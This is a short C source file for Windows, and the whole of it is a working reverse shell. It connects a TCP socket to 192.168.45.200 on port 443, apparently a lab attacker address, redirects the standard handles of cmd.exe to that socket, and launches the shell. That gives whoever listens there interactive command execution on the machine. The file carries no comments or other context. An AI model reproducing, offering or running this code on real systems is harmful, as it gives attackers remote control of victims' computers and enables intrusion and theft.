#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main () {
	WSADATA wsaData;
	SOCKET s;
	struct sockaddr_in server;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2,2), &wsaData);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	server.sin_family = AF_INET;
	server.sin_port = htons(443);
	server.sin_addr.s_addr = inet_addr("192.168.45.200");

	WSAConnect(s, (struct sockaddr *)&server, sizeof(server), NULL, NULL, NULL, NULL);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	
	closesocket(s);
	WSACleanup();
	return 0;
}
